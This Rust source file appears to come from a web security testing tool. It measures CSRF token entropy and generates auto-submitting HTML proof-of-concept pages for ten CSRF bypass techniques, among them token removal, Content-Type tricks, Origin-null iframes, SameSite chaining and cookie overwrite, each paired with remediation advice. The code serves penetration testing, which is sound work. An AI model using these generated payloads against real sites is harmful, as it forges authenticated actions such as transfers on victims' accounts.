use std::collections::HashMap;
use std::fmt;

use serde::{Deserialize, Serialize};

/// Identified CSRF bypass technique category.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum CsrfBypassTechnique {
    /// Server accepts stale or reused tokens (fixation).
    TokenFixation,
    /// POST endpoint also responds to GET which skips CSRF check.
    MethodOverride,
    /// Changing Content-Type removes server-side CSRF validation.
    ContentTypeBypass,
    /// Tokens from sibling subdomains accepted cross-origin.
    SubdomainTokenReuse,
    /// Missing or modified Referer/Origin header accepted.
    RefererOriginBypass,
    /// JSON body via form submission with text/plain Content-Type.
    JsonFormConfusion,
    /// Legacy Flash/PDF crossdomain.xml exploitation.
    FlashPdfCrossdomain,
    /// SameSite cookie attribute bypass via top-level navigation.
    SameSiteBypass,
    /// Token not validated at all (removed from request).
    TokenRemoval,
    /// Double-submit cookie pattern where cookie is attacker-controllable.
    DoubleSubmitCookieOverwrite,
}

impl fmt::Display for CsrfBypassTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::TokenFixation => write!(f, "Token Fixation"),
            Self::MethodOverride => write!(f, "Method Override (GET bypass)"),
            Self::ContentTypeBypass => write!(f, "Content-Type Bypass"),
            Self::SubdomainTokenReuse => write!(f, "Subdomain Token Reuse"),
            Self::RefererOriginBypass => write!(f, "Referer/Origin Header Bypass"),
            Self::JsonFormConfusion => write!(f, "JSON Form Confusion"),
            Self::FlashPdfCrossdomain => write!(f, "Flash/PDF Crossdomain Exploit"),
            Self::SameSiteBypass => write!(f, "SameSite Cookie Bypass"),
            Self::TokenRemoval => write!(f, "Token Removal"),
            Self::DoubleSubmitCookieOverwrite => write!(f, "Double-Submit Cookie Overwrite"),
        }
    }
}

/// Quality classification of CSRF token entropy.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum TokenStrength {
    /// Shannon entropy >= 3.5 bits/char, length >= 24, no detectable pattern.
    Strong,
    /// Entropy between 2.0-3.5 or length 12-24.
    Weak,
    /// Entropy < 2.0 or detectable sequential/timestamp pattern.
    Predictable,
}

impl fmt::Display for TokenStrength {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Strong => write!(f, "Strong"),
            Self::Weak => write!(f, "Weak"),
            Self::Predictable => write!(f, "Predictable"),
        }
    }
}

/// SameSite cookie attribute value.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum SameSitePolicy {
    Strict,
    Lax,
    None,
    /// Cookie has no SameSite attribute (browser defaults to Lax).
    NotSet,
}

impl fmt::Display for SameSitePolicy {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Strict => write!(f, "Strict"),
            Self::Lax => write!(f, "Lax"),
            Self::None => write!(f, "None"),
            Self::NotSet => write!(f, "Not Set (defaults to Lax)"),
        }
    }
}

/// Detected CSRF token format.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum TokenFormat {
    /// Hex-encoded bytes (e.g. `a3f2b1c4...`).
    Hex,
    /// Base64 or Base64URL encoded.
    Base64,
    /// UUID v4 format (`xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx`).
    Uuid,
    /// Numeric-only token.
    Numeric,
    /// JWT-like structure (three dot-separated base64 segments).
    Jwt,
    /// Unrecognized format.
    Opaque,
}

impl fmt::Display for TokenFormat {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Hex => write!(f, "Hex"),
            Self::Base64 => write!(f, "Base64"),
            Self::Uuid => write!(f, "UUID v4"),
            Self::Numeric => write!(f, "Numeric"),
            Self::Jwt => write!(f, "JWT"),
            Self::Opaque => write!(f, "Opaque"),
        }
    }
}

/// Result of analyzing a single CSRF token.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TokenAnalysis {
    pub token: String,
    pub format: TokenFormat,
    pub length: usize,
    pub entropy_bits_per_char: f64,
    pub strength: TokenStrength,
    pub has_timestamp_component: bool,
    pub has_sequential_pattern: bool,
}

/// Result of analyzing multiple tokens for predictability.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TokenSetAnalysis {
    pub sample_count: usize,
    pub format: TokenFormat,
    pub avg_entropy: f64,
    pub strength: TokenStrength,
    pub has_sequential_pattern: bool,
    pub has_timestamp_component: bool,
    pub common_prefix_len: usize,
    pub common_suffix_len: usize,
}

/// A confirmed CSRF bypass finding with PoC.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CsrfBypassFinding {
    pub technique: CsrfBypassTechnique,
    pub target_url: String,
    pub description: String,
    pub poc_html: Option<String>,
    pub confidence: f64,
    pub remediation: String,
}

/// Configuration for CSRF bypass testing.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CsrfTestConfig {
    pub target_url: String,
    pub method: String,
    pub parameters: HashMap<String, String>,
    pub csrf_param_name: Option<String>,
    pub csrf_header_name: Option<String>,
    pub cookies: HashMap<String, String>,
    pub same_site_policy: SameSitePolicy,
    pub target_domain: String,
}

impl CsrfTestConfig {
    pub fn new(target_url: &str, target_domain: &str) -> Self {
        Self {
            target_url: target_url.to_string(),
            method: "POST".to_string(),
            parameters: HashMap::new(),
            csrf_param_name: None,
            csrf_header_name: None,
            cookies: HashMap::new(),
            same_site_policy: SameSitePolicy::NotSet,
            target_domain: target_domain.to_string(),
        }
    }

    pub fn with_method(mut self, method: &str) -> Self {
        self.method = method.to_uppercase();
        self
    }

    pub fn with_parameter(mut self, key: &str, value: &str) -> Self {
        self.parameters.insert(key.to_string(), value.to_string());
        self
    }

    pub fn with_csrf_param(mut self, name: &str) -> Self {
        self.csrf_param_name = Some(name.to_string());
        self
    }

    pub fn with_csrf_header(mut self, name: &str) -> Self {
        self.csrf_header_name = Some(name.to_string());
        self
    }

    pub fn with_cookie(mut self, name: &str, value: &str) -> Self {
        self.cookies.insert(name.to_string(), value.to_string());
        self
    }

    pub fn with_same_site(mut self, policy: SameSitePolicy) -> Self {
        self.same_site_policy = policy;
        self
    }
}

/// Compute Shannon entropy in bits per character.
pub fn shannon_entropy(token: &str) -> f64 {
    if token.is_empty() {
        return 0.0;
    }

    let mut freq: HashMap<char, usize> = HashMap::new();
    for ch in token.chars() {
        *freq.entry(ch).or_insert(0) += 1;
    }

    let len = token.len() as f64;
    let mut entropy = 0.0_f64;
    for &count in freq.values() {
        let p = count as f64 / len;
        if p > 0.0 {
            entropy -= p * p.log2();
        }
    }
    entropy
}

/// Detect if a token contains a Unix-timestamp component.
pub fn detect_timestamp_component(token: &str) -> bool {
    let now_secs = 1_700_000_000u64;
    let range_low = now_secs - 365 * 86400;
    let range_high = now_secs + 365 * 86400;

    for window in extract_numeric_windows(token) {
        if window >= range_low && window <= range_high {
            return true;
        }
    }

    let ms_low = range_low * 1000;
    let ms_high = range_high * 1000;

    for window in extract_numeric_windows(token) {
        if window >= ms_low && window <= ms_high {
            return true;
        }
    }

    false
}

fn extract_numeric_windows(s: &str) -> Vec<u64> {
    let digits: String = s.chars().filter(|c| c.is_ascii_digit()).collect();
    let mut results = Vec::new();

    for width in [10, 13] {
        if digits.len() >= width {
            for start in 0..=digits.len() - width {
                if let Ok(val) = digits[start..start + width].parse::<u64>() {
                    results.push(val);
                }
            }
        }
    }
    results
}

/// Detect sequential patterns across multiple tokens.
pub fn detect_sequential_pattern(tokens: &[&str]) -> bool {
    if tokens.len() < 3 {
        return false;
    }

    let numeric_values: Vec<Option<i128>> = tokens
        .iter()
        .map(|t| {
            let digits: String = t.chars().filter(|c| c.is_ascii_digit()).collect();
            if digits.is_empty() {
                Option::None
            } else {
                digits.parse::<i128>().ok()
            }
        })
        .collect();

    let valid_pairs: Vec<(i128, i128)> = numeric_values
        .windows(2)
        .filter_map(|w| match (w[0], w[1]) {
            (Some(a), Some(b)) => Some((a, b)),
            _ => Option::None,
        })
        .collect();

    if valid_pairs.len() >= 2 {
        let diffs: Vec<i128> = valid_pairs.iter().map(|(a, b)| b - a).collect();
        let all_same_diff = diffs.windows(2).all(|w| w[0] == w[1]);
        if all_same_diff && diffs[0] != 0 {
            return true;
        }
    }

    let prefix_lens: Vec<usize> = tokens
        .windows(2)
        .map(|w| common_prefix_length(w[0], w[1]))
        .collect();

    if !prefix_lens.is_empty() {
        let avg_prefix = prefix_lens.iter().sum::<usize>() as f64 / prefix_lens.len() as f64;
        let avg_len = tokens.iter().map(|t| t.len()).sum::<usize>() as f64 / tokens.len() as f64;
        if avg_len > 0.0 && avg_prefix / avg_len > 0.8 {
            return true;
        }
    }

    false
}

fn common_prefix_length(a: &str, b: &str) -> usize {
    a.chars().zip(b.chars()).take_while(|(x, y)| x == y).count()
}

fn common_suffix_length(a: &str, b: &str) -> usize {
    a.chars()
        .rev()
        .zip(b.chars().rev())
        .take_while(|(x, y)| x == y)
        .count()
}

/// Identify the format of a CSRF token.
pub fn identify_token_format(token: &str) -> TokenFormat {
    if token.is_empty() {
        return TokenFormat::Opaque;
    }

    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() == 3
        && parts.iter().all(|p| {
            !p.is_empty()
                && p.chars().all(|c| {
                    c.is_ascii_alphanumeric()
                        || c == '-'
                        || c == '_'
                        || c == '='
                        || c == '+'
                        || c == '/'
                })
        })
    {
        return TokenFormat::Jwt;
    }

    let uuid_stripped = token.replace('-', "");
    if token.len() == 36
        && uuid_stripped.len() == 32
        && uuid_stripped.chars().all(|c| c.is_ascii_hexdigit())
        && token.chars().filter(|&c| c == '-').count() == 4
    {
        return TokenFormat::Uuid;
    }

    if token.chars().all(|c| c.is_ascii_digit()) {
        return TokenFormat::Numeric;
    }

    if token.chars().all(|c| c.is_ascii_hexdigit()) && token.len() >= 8 {
        return TokenFormat::Hex;
    }

    if token.chars().all(|c| {
        c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=' || c == '-' || c == '_'
    }) && (token.ends_with('=') || token.len().is_multiple_of(4))
        && token.len() >= 8
    {
        return TokenFormat::Base64;
    }

    TokenFormat::Opaque
}

/// Analyze a single CSRF token for entropy and format.
pub fn analyze_token(token: &str) -> TokenAnalysis {
    let entropy = shannon_entropy(token);
    let format = identify_token_format(token);
    let has_timestamp = detect_timestamp_component(token);

    let strength = classify_strength(entropy, token.len(), has_timestamp, false);

    TokenAnalysis {
        token: token.to_string(),
        format,
        length: token.len(),
        entropy_bits_per_char: entropy,
        strength,
        has_timestamp_component: has_timestamp,
        has_sequential_pattern: false,
    }
}

/// Analyze a set of tokens for predictability patterns.
pub fn analyze_token_set(tokens: &[&str]) -> TokenSetAnalysis {
    if tokens.is_empty() {
        return TokenSetAnalysis {
            sample_count: 0,
            format: TokenFormat::Opaque,
            avg_entropy: 0.0,
            strength: TokenStrength::Predictable,
            has_sequential_pattern: false,
            has_timestamp_component: false,
            common_prefix_len: 0,
            common_suffix_len: 0,
        };
    }

    let entropies: Vec<f64> = tokens.iter().map(|t| shannon_entropy(t)).collect();
    let avg_entropy = entropies.iter().sum::<f64>() / entropies.len() as f64;
    let format = identify_token_format(tokens[0]);
    let sequential = detect_sequential_pattern(tokens);
    let has_timestamp = tokens.iter().any(|t| detect_timestamp_component(t));

    let prefix_len = if tokens.len() >= 2 {
        let mut min_prefix = usize::MAX;
        for pair in tokens.windows(2) {
            min_prefix = min_prefix.min(common_prefix_length(pair[0], pair[1]));
        }
        min_prefix
    } else {
        0
    };

    let suffix_len = if tokens.len() >= 2 {
        let mut min_suffix = usize::MAX;
        for pair in tokens.windows(2) {
            min_suffix = min_suffix.min(common_suffix_length(pair[0], pair[1]));
        }
        min_suffix
    } else {
        0
    };

    let avg_len = tokens.iter().map(|t| t.len()).sum::<usize>() as f64 / tokens.len() as f64;

    let strength = classify_strength(avg_entropy, avg_len as usize, has_timestamp, sequential);

    TokenSetAnalysis {
        sample_count: tokens.len(),
        format,
        avg_entropy,
        strength,
        has_sequential_pattern: sequential,
        has_timestamp_component: has_timestamp,
        common_prefix_len: prefix_len,
        common_suffix_len: suffix_len,
    }
}

fn classify_strength(
    entropy: f64,
    length: usize,
    has_timestamp: bool,
    sequential: bool,
) -> TokenStrength {
    if sequential || entropy < 2.0 {
        return TokenStrength::Predictable;
    }
    if has_timestamp && entropy < 3.0 {
        return TokenStrength::Predictable;
    }
    if entropy >= 3.5 && length >= 24 && !has_timestamp {
        return TokenStrength::Strong;
    }
    TokenStrength::Weak
}

/// Generate a token fixation bypass test configuration.
pub fn generate_token_fixation_bypass(
    config: &CsrfTestConfig,
    stale_token: &str,
) -> CsrfBypassFinding {
    let csrf_param = config.csrf_param_name.as_deref().unwrap_or("csrf_token");

    let mut params = config.parameters.clone();
    params.insert(csrf_param.to_string(), stale_token.to_string());

    let poc = generate_form_poc(&config.target_url, &config.method, &params);

    CsrfBypassFinding {
        technique: CsrfBypassTechnique::TokenFixation,
        target_url: config.target_url.clone(),
        description: format!(
            "Server may accept stale/reused CSRF token '{}' on {}",
            truncate_token(stale_token),
            config.target_url
        ),
        poc_html: Some(poc),
        confidence: 0.6,
        remediation: "Implement one-time-use CSRF tokens that are invalidated after each request. Bind tokens to the user session and validate freshness server-side.".to_string(),
    }
}

/// Generate a method override bypass (POST → GET).
pub fn generate_method_override_bypass(config: &CsrfTestConfig) -> CsrfBypassFinding {
    let params_query: String = config
        .parameters
        .iter()
        .map(|(k, v)| format!("{}={}", url_encode(k), url_encode(v)))
        .collect::<Vec<_>>()
        .join("&");

    let get_url = if params_query.is_empty() {
        config.target_url.clone()
    } else {
        format!("{}?{}", config.target_url, params_query)
    };

    let poc = format!(
        r#"<html>
<body>
<h2>CSRF Method Override PoC</h2>
<p>Target: {target}</p>
<img src="{get_url}" style="display:none" />
<script>
  // Alternative: fetch with GET
  fetch("{get_url}", {{ mode: "no-cors", credentials: "include" }});
</script>
</body>
</html>"#,
        target = html_escape(&config.target_url),
        get_url = html_escape(&get_url),
    );

    CsrfBypassFinding {
        technique: CsrfBypassTechnique::MethodOverride,
        target_url: config.target_url.clone(),
        description: format!(
            "POST endpoint {} may also accept GET requests which typically lack CSRF protection",
            config.target_url
        ),
        poc_html: Some(poc),
        confidence: 0.5,
        remediation: "Enforce HTTP method validation. Ensure state-changing operations only accept POST/PUT/DELETE and apply CSRF protection to all mutating methods.".to_string(),
    }
}

/// Generate a Content-Type bypass test.
pub fn generate_content_type_bypass(config: &CsrfTestConfig) -> CsrfBypassFinding {
    let body_pairs: Vec<String> = config
        .parameters
        .iter()
        .map(|(k, v)| format!("{}={}", url_encode(k), url_encode(v)))
        .collect();
    let body = body_pairs.join("&");

    let poc = format!(
        r#"<html>
<body>
<h2>CSRF Content-Type Bypass PoC</h2>
<p>Target: {target}</p>
<script>
  // Send with text/plain Content-Type to bypass CSRF check
  fetch("{target}", {{
    method: "POST",
    mode: "no-cors",
    credentials: "include",
    headers: {{ "Content-Type": "text/plain" }},
    body: "{body}"
  }});
  // Also try multipart/form-data via form
</script>
<form id="f" method="POST" action="{target}" enctype="text/plain">
  <input type="hidden" name='{json_trick}' value='' />
</form>
<script>document.getElementById("f").submit();</script>
</body>
</html>"#,
        target = html_escape(&config.target_url),
        body = html_escape(&body),
        json_trick = r#"{"action":"transfer","amount":"1000"}&ignore="#,
    );

    CsrfBypassFinding {
        technique: CsrfBypassTechnique::ContentTypeBypass,
        target_url: config.target_url.clone(),
        description: format!(
            "Server at {} may not validate Content-Type header, allowing CSRF via text/plain or multipart/form-data",
            config.target_url
        ),
        poc_html: Some(poc),
        confidence: 0.5,
        remediation: "Validate Content-Type server-side. Reject requests that do not match the expected Content-Type (e.g. application/json). Use a CSRF token regardless of Content-Type.".to_string(),
    }
}

/// Generate a subdomain token reuse bypass test.
pub fn generate_subdomain_bypass(
    config: &CsrfTestConfig,
    sibling_subdomain: &str,
) -> CsrfBypassFinding {
    let poc = format!(
        r#"<html>
<body>
<h2>CSRF Subdomain Token Reuse PoC</h2>
<p>Attacker subdomain: {attacker}</p>
<p>Target: {target}</p>
<script>
  // From {attacker}, attempt to use a CSRF token obtained on the sibling subdomain.
  // This requires the attacker to control a sibling subdomain (e.g. via XSS or subdomain takeover).
  // Step 1: Obtain token from {attacker} page
  // Step 2: Submit form to {target} with that token
  var token = "CSRF_TOKEN_FROM_SIBLING";
  var form = document.createElement("form");
  form.method = "POST";
  form.action = "{target}";
  var input = document.createElement("input");
  input.type = "hidden";
  input.name = "{param}";
  input.value = token;
  form.appendChild(input);
  document.body.appendChild(form);
  form.submit();
</script>
</body>
</html>"#,
        attacker = html_escape(sibling_subdomain),
        target = html_escape(&config.target_url),
        param = html_escape(config.csrf_param_name.as_deref().unwrap_or("csrf_token")),
    );

    CsrfBypassFinding {
        technique: CsrfBypassTechnique::SubdomainTokenReuse,
        target_url: config.target_url.clone(),
        description: format!(
            "CSRF tokens from {} may be valid on {} if token scope is not bound to the exact origin",
            sibling_subdomain, config.target_url
        ),
        poc_html: Some(poc),
        confidence: 0.4,
        remediation: "Bind CSRF tokens to the exact origin/domain. Validate that the token was issued for the specific hostname handling the request.".to_string(),
    }
}

/// Generate Referer/Origin header bypass tests.
pub fn generate_referer_origin_bypass(config: &CsrfTestConfig) -> Vec<CsrfBypassFinding> {
    let mut findings = Vec::new();

    // Missing Referer
    let poc_no_referer = format!(
        r#"<html>
<head>
<meta name="referrer" content="no-referrer">
</head>
<body>
<h2>CSRF Referer Suppression PoC</h2>
<form id="f" method="POST" action="{target}">
{hidden_fields}
</form>
<script>document.getElementById("f").submit();</script>
</body>
</html>"#,
        target = html_escape(&config.target_url),
        hidden_fields = generate_hidden_inputs(&config.parameters),
    );

    findings.push(CsrfBypassFinding {
        technique: CsrfBypassTechnique::RefererOriginBypass,
        target_url: config.target_url.clone(),
        description: format!(
            "Server at {} may accept requests with missing Referer header (suppressed via meta referrer policy)",
            config.target_url
        ),
        poc_html: Some(poc_no_referer),
        confidence: 0.6,
        remediation: "Reject requests with missing Referer/Origin headers for state-changing operations. Implement strict origin validation.".to_string(),
    });

    // Spoofed Origin via data: URI
    let poc_spoofed_origin = format!(
        r#"<html>
<body>
<h2>CSRF Origin Bypass via data: URI</h2>
<iframe id="payload" name="payload"></iframe>
<script>
  // Requests from data: URIs have Origin: null
  var iframe = document.getElementById("payload");
  iframe.src = 'data:text/html,<form id="f" method="POST" action="{target}">{escaped_fields}</form><script>document.getElementById("f").submit();<\/script>';
</script>
</body>
</html>"#,
        target = html_escape(&config.target_url),
        escaped_fields = html_escape(&generate_hidden_inputs(&config.parameters)),
    );

    findings.push(CsrfBypassFinding {
        technique: CsrfBypassTechnique::RefererOriginBypass,
        target_url: config.target_url.clone(),
        description: format!(
            "Server at {} may accept 'Origin: null' from data: URI iframes or sandboxed contexts",
            config.target_url
        ),
        poc_html: Some(poc_spoofed_origin),
        confidence: 0.5,
        remediation: "Do not accept 'null' as a valid Origin. Validate Origin against an explicit allowlist of trusted origins.".to_string(),
    });

    findings
}

/// Generate a JSON form confusion CSRF payload.
pub fn generate_json_csrf_bypass(config: &CsrfTestConfig, json_body: &str) -> CsrfBypassFinding {
    let poc = format!(
        r#"<html>
<body>
<h2>CSRF JSON Body via Form Submission</h2>
<p>Target: {target}</p>
<form id="f" method="POST" action="{target}" enctype="text/plain">
  <input type="hidden" name='{json_payload}' value='' />
</form>
<script>document.getElementById("f").submit();</script>
</body>
</html>"#,
        target = html_escape(&config.target_url),
        json_payload = html_escape(json_body),
    );

    CsrfBypassFinding {
        technique: CsrfBypassTechnique::JsonFormConfusion,
        target_url: config.target_url.clone(),
        description: format!(
            "JSON endpoint at {} may be exploitable via form submission with text/plain enctype. \
             The browser sends Content-Type: text/plain which some servers parse as JSON.",
            config.target_url
        ),
        poc_html: Some(poc),
        confidence: 0.5,
        remediation: "Validate Content-Type strictly as application/json. Require a custom header (e.g. X-Requested-With) that cannot be set by simple cross-origin requests.".to_string(),
    }
}

/// Generate Flash/PDF crossdomain.xml exploitation payloads (legacy).
pub fn generate_flash_pdf_bypass(config: &CsrfTestConfig) -> CsrfBypassFinding {
    let domain = &config.target_domain;

    let crossdomain_xml = r#"<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
  <allow-access-from domain="*" />
  <allow-http-request-headers-from domain="*" headers="*"/>
</cross-domain-policy>"#
        .to_string();

    let poc = format!(
        r#"<html>
<body>
<h2>CSRF Flash/PDF Crossdomain Exploit PoC</h2>
<p>Target domain: {domain}</p>
<p>This attack requires a permissive crossdomain.xml on the target server.</p>
<h3>Malicious crossdomain.xml check:</h3>
<pre>GET {domain}/crossdomain.xml</pre>
<h3>Expected vulnerable policy:</h3>
<pre>{xml}</pre>
<p>If the target serves a permissive crossdomain.xml, a Flash/Silverlight SWF hosted on the
attacker domain can make authenticated cross-origin requests to the target.</p>
<h3>Attack vector (Flash):</h3>
<pre>
// ActionScript snippet:
var req:URLRequest = new URLRequest("{target}");
req.method = URLRequestMethod.POST;
req.data = "action=transfer&amp;amount=1000";
sendToURL(req);
</pre>
</body>
</html>"#,
        domain = html_escape(domain),
        xml = html_escape(&crossdomain_xml),
        target = html_escape(&config.target_url),
    );

    CsrfBypassFinding {
        technique: CsrfBypassTechnique::FlashPdfCrossdomain,
        target_url: config.target_url.clone(),
        description: format!(
            "Target domain {} should be checked for permissive crossdomain.xml or clientaccesspolicy.xml \
             that would allow cross-origin authenticated requests via Flash/Silverlight (legacy but still exploitable)",
            domain
        ),
        poc_html: Some(poc),
        confidence: 0.3,
        remediation: "Remove or restrict crossdomain.xml to only trusted domains. Set allow-access-from to specific domains rather than wildcard (*). Modern browsers have removed Flash support but PDF-based variants persist.".to_string(),
    }
}

/// Generate SameSite bypass test payloads.
pub fn generate_samesite_bypass(config: &CsrfTestConfig) -> CsrfBypassFinding {
    let (description, confidence, poc_content) = match config.same_site_policy {
        SameSitePolicy::None => (
            format!(
                "Session cookies on {} use SameSite=None, providing no CSRF protection from the SameSite attribute. \
                 Any cross-site form submission or fetch with credentials will include cookies.",
                config.target_url
            ),
            0.9,
            generate_samesite_none_poc(config),
        ),
        SameSitePolicy::Lax | SameSitePolicy::NotSet => (
            format!(
                "Session cookies on {} use SameSite=Lax (or default). Top-level GET navigations will include cookies. \
                 If the endpoint accepts GET or a method override is possible, CSRF is exploitable via top-level navigation.",
                config.target_url
            ),
            0.6,
            generate_samesite_lax_poc(config),
        ),
        SameSitePolicy::Strict => (
            format!(
                "Session cookies on {} use SameSite=Strict. Direct cross-site requests will not include cookies. \
                 Bypass requires chaining with an open redirect or client-side navigation on the target origin.",
                config.target_url
            ),
            0.2,
            generate_samesite_strict_poc(config),
        ),
    };

    CsrfBypassFinding {
        technique: CsrfBypassTechnique::SameSiteBypass,
        target_url: config.target_url.clone(),
        description,
        poc_html: Some(poc_content),
        confidence,
        remediation: "Set SameSite=Strict on session cookies where possible. For Lax, ensure no state-changing GET endpoints exist. Always combine SameSite with explicit CSRF tokens for defense-in-depth.".to_string(),
    }
}

/// Generate a token removal bypass test.
pub fn generate_token_removal_bypass(config: &CsrfTestConfig) -> CsrfBypassFinding {
    let mut params_without_csrf = config.parameters.clone();
    if let Some(ref csrf_name) = config.csrf_param_name {
        params_without_csrf.remove(csrf_name);
    }

    let poc = generate_form_poc(&config.target_url, &config.method, &params_without_csrf);

    CsrfBypassFinding {
        technique: CsrfBypassTechnique::TokenRemoval,
        target_url: config.target_url.clone(),
        description: format!(
            "Server at {} may not enforce CSRF token presence. The request is sent without any CSRF parameter to test if the server accepts it.",
            config.target_url
        ),
        poc_html: Some(poc),
        confidence: 0.7,
        remediation: "Always validate CSRF token presence. Reject requests that are missing the expected CSRF token parameter or header entirely.".to_string(),
    }
}

/// Generate a double-submit cookie overwrite bypass.
pub fn generate_double_submit_bypass(
    config: &CsrfTestConfig,
    cookie_name: &str,
) -> CsrfBypassFinding {
    let poc = format!(
        r#"<html>
<body>
<h2>CSRF Double-Submit Cookie Overwrite PoC</h2>
<p>Target: {target}</p>
<p>Cookie to overwrite: {cookie}</p>
<script>
  // Overwrite the CSRF cookie via a subdomain or cookie injection
  // If attacker controls a sibling subdomain, they can set cookies for the parent domain
  document.cookie = "{cookie}=attacker_controlled_value; domain={domain}; path=/";

  // Submit form with matching token
  var form = document.createElement("form");
  form.method = "POST";
  form.action = "{target}";
  var input = document.createElement("input");
  input.type = "hidden";
  input.name = "{param}";
  input.value = "attacker_controlled_value";
  form.appendChild(input);
  {extra_fields}
  document.body.appendChild(form);
  form.submit();
</script>
</body>
</html>"#,
        target = html_escape(&config.target_url),
        cookie = html_escape(cookie_name),
        domain = html_escape(&config.target_domain),
        param = html_escape(config.csrf_param_name.as_deref().unwrap_or("csrf_token")),
        extra_fields = generate_js_hidden_inputs(&config.parameters),
    );

    CsrfBypassFinding {
        technique: CsrfBypassTechnique::DoubleSubmitCookieOverwrite,
        target_url: config.target_url.clone(),
        description: format!(
            "Double-submit cookie pattern on {} using cookie '{}' may be bypassed if the attacker can \
             set cookies on the target domain (e.g. via subdomain control or cookie injection).",
            config.target_url, cookie_name
        ),
        poc_html: Some(poc),
        confidence: 0.4,
        remediation: "Use HMAC-signed double-submit cookies bound to the session. The server should sign the cookie value with a secret so that attacker-set cookies fail validation.".to_string(),
    }
}

/// Run all CSRF bypass generators against a target config, returning all findings.
pub fn generate_all_bypasses(config: &CsrfTestConfig) -> Vec<CsrfBypassFinding> {
    let mut findings = Vec::new();

    findings.push(generate_token_removal_bypass(config));
    findings.push(generate_method_override_bypass(config));
    findings.push(generate_content_type_bypass(config));
    findings.extend(generate_referer_origin_bypass(config));
    findings.push(generate_json_csrf_bypass(
        config,
        r#"{"action":"transfer","amount":"1000"}"#,
    ));
    findings.push(generate_flash_pdf_bypass(config));
    findings.push(generate_samesite_bypass(config));
    findings.push(generate_token_fixation_bypass(
        config,
        "stale_token_example",
    ));
    findings.push(generate_subdomain_bypass(
        config,
        &format!("attacker.{}", config.target_domain),
    ));
    findings.push(generate_double_submit_bypass(config, "csrf_cookie"));

    findings
}

fn generate_form_poc(target_url: &str, method: &str, params: &HashMap<String, String>) -> String {
    format!(
        r#"<html>
<body>
<h2>CSRF PoC</h2>
<form id="f" method="{method}" action="{target}">
{hidden_fields}
</form>
<script>document.getElementById("f").submit();</script>
</body>
</html>"#,
        method = html_escape(method),
        target = html_escape(target_url),
        hidden_fields = generate_hidden_inputs(params),
    )
}

fn generate_hidden_inputs(params: &HashMap<String, String>) -> String {
    params
        .iter()
        .map(|(k, v)| {
            format!(
                r#"  <input type="hidden" name="{}" value="{}" />"#,
                html_escape(k),
                html_escape(v)
            )
        })
        .collect::<Vec<_>>()
        .join("\n")
}

fn generate_js_hidden_inputs(params: &HashMap<String, String>) -> String {
    params
        .iter()
        .map(|(k, v)| {
            format!(
                r#"  var i = document.createElement("input"); i.type = "hidden"; i.name = "{}"; i.value = "{}"; form.appendChild(i);"#,
                js_escape(k),
                js_escape(v)
            )
        })
        .collect::<Vec<_>>()
        .join("\n")
}

fn generate_samesite_none_poc(config: &CsrfTestConfig) -> String {
    format!(
        r#"<html>
<body>
<h2>CSRF SameSite=None PoC</h2>
<p>Cookies with SameSite=None are sent on all cross-site requests.</p>
<form id="f" method="POST" action="{target}">
{hidden_fields}
</form>
<script>document.getElementById("f").submit();</script>
</body>
</html>"#,
        target = html_escape(&config.target_url),
        hidden_fields = generate_hidden_inputs(&config.parameters),
    )
}

fn generate_samesite_lax_poc(config: &CsrfTestConfig) -> String {
    let params_query: String = config
        .parameters
        .iter()
        .map(|(k, v)| format!("{}={}", url_encode(k), url_encode(v)))
        .collect::<Vec<_>>()
        .join("&");

    format!(
        r#"<html>
<body>
<h2>CSRF SameSite=Lax Bypass via Top-Level Navigation</h2>
<p>SameSite=Lax allows cookies on top-level GET navigations.</p>
<!-- Method 1: Top-level navigation via window.open -->
<script>
  window.open("{target}?{params}", "_blank");
</script>
<!-- Method 2: Link click simulation -->
<a id="link" href="{target}?{params}">Click here</a>
<script>document.getElementById("link").click();</script>
</body>
</html>"#,
        target = html_escape(&config.target_url),
        params = html_escape(&params_query),
    )
}

fn generate_samesite_strict_poc(config: &CsrfTestConfig) -> String {
    format!(
        r#"<html>
<body>
<h2>CSRF SameSite=Strict Bypass Attempt</h2>
<p>SameSite=Strict blocks cross-site cookie sending. Bypass requires:</p>
<ul>
  <li>Open redirect on the target origin to chain into a same-site request</li>
  <li>Client-side navigation from an existing same-site page</li>
  <li>Dangling markup injection on the target to trigger same-site form submission</li>
</ul>
<!-- This requires a chained vulnerability: open redirect + CSRF -->
<script>
  // If an open redirect exists at {target_domain}/redirect?url=...
  // The redirect makes the browser treat the subsequent request as same-site
  window.location = "https://{target_domain}/redirect?url={encoded_target}";
</script>
</body>
</html>"#,
        target_domain = html_escape(&config.target_domain),
        encoded_target = url_encode(&config.target_url),
    )
}

fn truncate_token(token: &str) -> String {
    if token.len() > 16 {
        format!("{}...", &token[..16])
    } else {
        token.to_string()
    }
}

fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

fn js_escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\'', "\\'")
        .replace('\n', "\\n")
}

fn url_encode(s: &str) -> String {
    let mut result = String::new();
    for byte in s.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                result.push(byte as char);
            }
            _ => {
                result.push_str(&format!("%{:02X}", byte));
            }
        }
